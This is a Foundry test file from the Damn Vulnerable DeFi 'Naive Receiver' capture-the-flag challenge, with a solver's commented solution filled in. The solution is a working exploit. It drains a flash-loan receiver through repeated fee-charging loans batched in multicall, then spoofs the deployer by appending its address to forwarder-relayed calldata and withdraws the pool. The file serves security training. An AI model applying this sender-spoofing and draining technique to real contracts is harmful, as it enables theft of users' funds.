// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        /**
         * We have to call the multicall with 11 calls to empty out the wETH user
         */
        bytes[] memory callDatas = new bytes[](11);

        //Encode flash loan call - on behalf of the Naive receiver of the loan
        for (uint i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan,
                (receiver, address(weth), 1, "0x")
            ); //We are filling the static array callDatas with the necessary encoded calls to call.
            //function we want to call and the parameters to pass
        }
        // Above are 10 calls pumped into callDatas
        // The 11th call into callDatas, is the one to empty out the pool.

        //encoding the 11th call
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            bytes32(uint256(uint160(deployer)))
            /*This is encoding the deployer address to the call to be passed to the basic forwarder.
             *This is because we need to have the last 20 bytes equal to that of the deployer for impersonation.*/
        );
        /**
         * We are deploying and making the call on behalf of the deployer
         */

        //Encode and ready for the multicall
        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
        //pool.multicall because pool is multicall i.e. inherited into it this

        //Now we want to make sure the call goes through the basic forwarder
        //Create the request for the forwarder
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            multicallData,
            1 days
        );
        //Above it is BasicForwarder and not the initialized instance of the forwarder. This because of the reference to the imported version. The basic forwarder has to be a standing logic by itself.
        /**
         * forwarder.nonces(player), //This is like this because it needs call from the initialized instance
         */

        //Now we create a requestHash
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        //Sign the requestHash
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute request
        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
